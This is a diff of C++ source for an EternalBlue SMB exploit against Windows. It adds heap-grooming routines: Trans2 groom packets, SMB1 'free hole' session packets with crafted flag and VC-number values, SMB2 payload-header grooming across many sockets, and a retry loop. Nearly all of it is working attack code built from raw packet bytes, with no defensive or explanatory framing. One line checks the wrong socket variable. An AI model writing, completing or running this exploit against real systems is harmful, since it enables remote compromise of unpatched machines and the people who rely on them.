@@ -14,7 +14,6 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
 
-// Helper to print byte buffer in hex
 std::string bytes_to_hex(const unsigned char* data, size_t len) {
     std::stringstream ss;
     ss << std::hex;
@@ -300,52 +299,71 @@ private:
 class EternalBlue {
 private:
     std::string targetIP;
-    SOCKET sock = INVALID_SOCKET;
     
     enum class ExploitType {
         TRANS2_BUFFER,
         TRANS2_ZERO, 
         TRANS2_EXPLOIT
     };
-    
+
+    int groomAllocations = 12;
+    int groomDelta = 5;
+    int maxExploitAttempts = 1;
+
     unsigned char smbNegotiate[137];
     unsigned char sessionSetup[140];
     unsigned char treeConnectRequest[100];
     unsigned char userID[2] = {0, 0};       
-    unsigned char treeID[2] = {0, 0};    
+    unsigned char treeID[2] = {0, 0};  
     
-    int groomCount = 15;
-    int groomDelta = 5;
+    std::vector<SOCKET> groomSockets;
 public:
     EternalBlue() {
         InitializePackets();
-    }
-
-    ~EternalBlue() {
-        if (sock != INVALID_SOCKET) closesocket(sock);
     }
 
     bool Exploit(const std::string& host) {
         targetIP = host;
         std::cout << "[*] Target: " << host << "\n\n";
 
-        if (!Connect()) return false;
-        if (!SendNegotiate()) return false;
-        if (!DoSessionSetup()) return false;
-        if (!SendTreeConnect()) return false;
-        
-        if (!SendNTLargeBuffer()) {
-            std::cout << "[-] NT Trans Large Buffer failed\n";
-            return false;
+        for (int attempt = 0; attempt < maxExploitAttempts; ++attempt) {
+            int grooms = groomAllocations + groomDelta * attempt;
+            auto payload_hdr = MakeSMB2PayloadHeadersPacket();
+
+            SOCKET sock = Connect();
+            if (sock == INVALID_SOCKET) continue;
+            
+            if (!SendNegotiate(sock)) { closesocket(sock); continue; }
+            if (!DoSessionSetup(sock)) { closesocket(sock); continue; }
+            if (!SendTreeConnect(sock)) { closesocket(sock); continue; }
+            
+            if (!SendNTLargeBuffer(sock)) { closesocket(sock); continue; }
+            
+            SOCKET fhs_sock = Smb1FreeHole(true);
+            if (fhs_sock == INVALID_SOCKET) { closesocket(sock); continue; }
+
+            if (!SMB2Grooming(grooms, payload_hdr)) { 
+                closesocket(fhs_sock); closesocket(sock); continue; 
+            }
+
+            closesocket(fhs_sock);
+
+            if (!SMB2Grooming(6, payload_hdr)) { closesocket(sock); continue; }
+
+            SOCKET fhf_sock = Smb1FreeHole(false);
+            if (fhs_sock == INVALID_SOCKET) { closesocket(sock); continue; }
+
+            closesocket(fhf_sock);
         }
-        
+
         return true;
     }
 
 private:
-    bool Connect() {
-        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (sock == INVALID_SOCKET) return false;
+
+    SOCKET Connect() {
+        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == INVALID_SOCKET) return INVALID_SOCKET;
 
         int timeout = 5000;
         setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
@@ -361,10 +379,10 @@ private:
             return false;
         }
 
-        return true;
+        return sock;
     }
 
-    bool Send(const unsigned char* data, size_t size) {
+    bool Send(SOCKET sock, const unsigned char* data, size_t size) {
         int sent = send(sock, (char*)data, size, 0);
         if (sent != (int)size) {
             std::cout << "[-] Send failed: " << sent << "/" << size << "\n";
@@ -373,7 +391,7 @@ private:
         return true;
     }
 
-    int Recv(unsigned char* buffer, size_t size) {
+    int Recv(SOCKET sock, unsigned char* buffer, size_t size) {
         int received = recv(sock, (char*)buffer, size, 0);
         if (received <= 0) {
             std::cout << "[-] Recv failed: " << WSAGetLastError() << "\n";
@@ -420,21 +438,21 @@ private:
         memcpy(treeConnectRequest, treeConnect, sizeof(treeConnect));
     }
 
-    bool SendNegotiate() {
-        if (!Send(smbNegotiate, sizeof(smbNegotiate))) return false;
+    bool SendNegotiate(SOCKET sock) {
+        if (!Send(sock, smbNegotiate, sizeof(smbNegotiate))) return false;
 
         unsigned char resp[1024];
-        int len = Recv(resp, sizeof(resp));
+        int len = Recv(sock, resp, sizeof(resp));
 
         if (len < 36) return false;
         return true;
     }
 
-    bool DoSessionSetup() {
-        if (!Send(sessionSetup, sizeof(sessionSetup))) return false;
+    bool DoSessionSetup(SOCKET sock) {
+        if (!Send(sock, sessionSetup, sizeof(sessionSetup))) return false;
 
         unsigned char resp[1024];
-        int len = Recv(resp, sizeof(resp));
+        int len = Recv(sock, resp, sizeof(resp));
         if (len < 36) {
             return false;
         }
@@ -448,7 +466,7 @@ private:
         return true;
     }
 
-    bool SendTreeConnect() {
+    bool SendTreeConnect(SOCKET sock) {
         treeConnectRequest[32] = userID[0];
         treeConnectRequest[33] = userID[1];
 
@@ -460,12 +478,12 @@ private:
         //     treeConnectRequest[pathOffset + (i * 2) + 1] = 0x00;
         // }
 
-        if (!Send(treeConnectRequest, sizeof(treeConnectRequest))) {
+        if (!Send(sock, treeConnectRequest, sizeof(treeConnectRequest))) {
             return false;
         }
 
         unsigned char resp[1024];
-        int len = Recv(resp, sizeof(resp));
+        int len = Recv(sock, resp, sizeof(resp));
 
         if (len < 36) return false;
 
@@ -624,7 +642,6 @@ private:
             }
             
             case ExploitType::TRANS2_ZERO: {
-                std::cout << "[*] Making TRANS2_ZERO packet\n";
                 data_section.insert(data_section.end(), 2055, 0x00);  
                 data_section.insert(data_section.end(), {0x83, 0xF3}); 
                 data_section.insert(data_section.end(), 2039, 0x41); 
@@ -637,7 +654,6 @@ private:
             }
         }
         
-        // Add data section to packet
         pkt.insert(pkt.end(), data_section.begin(), data_section.end());
         
         // Update NetBIOS length
@@ -650,26 +666,168 @@ private:
         return pkt;
     }
 
-    bool SendNTLargeBuffer() {
+    bool SendNTLargeBuffer(SOCKET sock) {
         auto nt_trans_pkt = MakeSMB1NTTransPacket();
 
-        if (!Send(nt_trans_pkt.data(), nt_trans_pkt.size())) {
+        if (!Send(sock, nt_trans_pkt.data(), nt_trans_pkt.size())) {
             return false;
         }
         
         unsigned char resp[1024];
-        Recv(resp, sizeof(resp));
+        Recv(sock, resp, sizeof(resp));
         
         std::vector<uint8_t> all_packets;
         
         auto trans2_zero_pkt = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_ZERO, 0);
         all_packets.insert(all_packets.end(), trans2_zero_pkt.begin(), trans2_zero_pkt.end());
         
-        std::cout << bytes_to_hex(trans2_zero_pkt.data(), trans2_zero_pkt.size()) << "\n";
+        for (int i = 1; i < 15; i++) {
+            auto groom_pkt = MakeSMB1Trans2ExploitPacket(ExploitType::TRANS2_BUFFER, i);
+            all_packets.insert(all_packets.end(), groom_pkt.begin(), groom_pkt.end());
+        }
 
+        if (!Send(sock, all_packets.data(), all_packets.size())) return false;
         return true;
     }
 
+    std::vector<uint8_t> MakeSMB1FreeHoleSessionPacket(const std::vector<uint8_t>& flags2, const std::vector<uint8_t>& vcnum,const std::vector<uint8_t>& native_os) {
+        std::vector<uint8_t> packet;
+        
+        // NetBIOS header
+        packet.insert(packet.end(), {0x00, 0x00, 0x00, 0x00});
+
+        // SMB Header (32 bytes)
+        packet.insert(packet.end(), {
+            0xFF, 0x53, 0x4D, 0x42,     // SMB signature
+            0x73,                       // Command: SESSION_SETUP_ANDX
+            0x00, 0x00, 0x00, 0x00,     // Status
+            0x18,                       // Flags
+            flags2[0], flags2[1],       // Flags2
+            0x00, 0x00,                 // PID High
+            0x00, 0x00, 0x00, 0x00,     // Security Features
+            0x00, 0x00, 0x00, 0x00,     // Security Features
+            0x00, 0x00,                 // Reserved
+            0x00, 0x00,                 // TID
+            0xFF, 0xFE,                 // PID  
+            0x00, 0x00,                 // UID
+            0x40, 0x00                  // MID
+        });
+
+        // Parameter Block
+        packet.insert(packet.end(), {
+            0x0C,                       // WordCount
+            0xFF,                       // AndXCommand (no next command)
+            0x00,                       // AndXReserved
+            0x00, 0x00,                 // AndXOffset
+            0x04, 0x11,                 // MaxBufferSize
+            0x0A, 0x00,                 // MaxMpxCount
+            vcnum[0], vcnum[1],         // VcNumber
+            0x00, 0x00, 0x00, 0x00,     // SessionKey
+            0x00, 0x00,                 // SecurityBlobLength
+            0x00, 0x00, 0x00, 0x00,     // Reserved
+            0x00, 0x00, 0x00, 0x80,     // Capabilities
+        });
+        
+        size_t byte_count_offset = packet.size();
+        packet.insert(packet.end(), {
+            0x00, 0x00,                 // ByteCount
+        });
+
+        packet.insert(packet.end(), native_os.begin(), native_os.end());
+        packet.insert(packet.end(), 15, 0x00); 
+
+        packet.insert(packet.end(), {0x00, 0x00});
+    
+        uint16_t byte_count = packet.size() - byte_count_offset - 2;
+        packet[byte_count_offset] = byte_count & 0xFF;
+        packet[byte_count_offset + 1] = (byte_count >> 8) & 0xFF;
+        
+        // Update NetBIOS length
+        uint32_t netbios_len = packet.size() - 4;
+        packet[0] = 0x00;
+        packet[1] = 0x00;
+        packet[2] = (netbios_len >> 8) & 0xFF;
+        packet[3] = netbios_len & 0xFF;
+        
+        return packet;
+    }
+
+    SOCKET Smb1FreeHole(bool start) {
+        SOCKET sock = Connect();
+        if (sock == INVALID_SOCKET) return INVALID_SOCKET;
+
+        if (!SendNegotiate(sock)) { 
+            closesocket(sock);
+            return INVALID_SOCKET;
+        }
+
+        std::vector<uint8_t> pkt;
+        if (start) {
+            pkt = MakeSMB1FreeHoleSessionPacket(
+                std::vector<uint8_t>{0x07, 0xC0},  // flags2
+                std::vector<uint8_t>{0x2D, 0x01},  // vc_number  
+                std::vector<uint8_t>{0xF0, 0xFF, 0x00, 0x00, 0x00}  // native_os
+            );
+        } else {
+            pkt = MakeSMB1FreeHoleSessionPacket(
+                std::vector<uint8_t>{0x07, 0x40},  // flags2
+                std::vector<uint8_t>{0x2C, 0x01},  // vc_number
+                std::vector<uint8_t>{0xF8, 0x87, 0x00, 0x00, 0x00}  // native_os
+            );
+        }
+
+        if (!Send(sock, pkt.data(), pkt.size())) {
+            closesocket(sock);
+            return INVALID_SOCKET;
+        }
+
+        unsigned char resp[1024];
+        int len = Recv(sock, resp, sizeof(resp));
+        if (len <= 0) {
+            closesocket(sock);
+            return INVALID_SOCKET;
+        }
+
+        return sock;
+    }
+
+    std::vector<uint8_t> MakeSMB2PayloadHeadersPacket() {
+        std::vector<uint8_t> pkt;
+        
+        // Session Message + Size
+        pkt.insert(pkt.end(), {
+            0x00,                           // Session Message
+            0x00, 0xFF, 0xF7,               // Size
+            0xFE, 'S', 'M', 'B',            // SMB2 signature
+        });
+        
+        pkt.insert(pkt.end(), 124, 0x00);
+        
+        return pkt;
+    }
+
+    bool SMB2Grooming(int grooms, const std::vector<uint8_t>& payload_hdr_pkt) {
+        groomSockets.clear();
+        
+        for (int i = 0; i < grooms; i++) {
+            SOCKET groom_sock = Connect();
+            if (groom_sock == INVALID_SOCKET) continue;
+            
+            if (!SendNegotiate(groom_sock)) {
+                closesocket(groom_sock);
+                continue;
+            }
+            
+            if (!Send(groom_sock, payload_hdr_pkt.data(), payload_hdr_pkt.size())) {
+                closesocket(groom_sock);
+                continue;
+            }
+            
+            groomSockets.push_back(groom_sock);
+        }
+        
+        return !groomSockets.empty();
+    }
 };
 
 class Attack {
